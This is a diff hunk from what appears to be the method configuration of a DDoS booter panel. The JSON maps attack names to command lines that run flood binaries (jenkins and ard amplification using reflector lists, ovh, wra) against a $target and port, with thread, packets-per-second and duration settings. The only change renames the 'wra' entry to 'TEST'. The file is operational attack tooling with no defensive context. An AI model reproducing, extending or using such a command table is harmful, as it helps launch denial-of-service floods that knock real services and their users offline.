@@ -5,5 +5,5 @@
     "udp-jenkins":"./jenkins $target/32 $port lists/jenkins.list $threads $pps $time",
     "udp-ard":"./ard $target $port lists/ard.list $threads $pps $time",
     "ovh":"./ovh $target $port 556 $threads $pps $time",
-    "wra":"./wra $target $port $threads $pps $time"
+    "TEST":"./wra $target $port $threads $pps $time"
 }
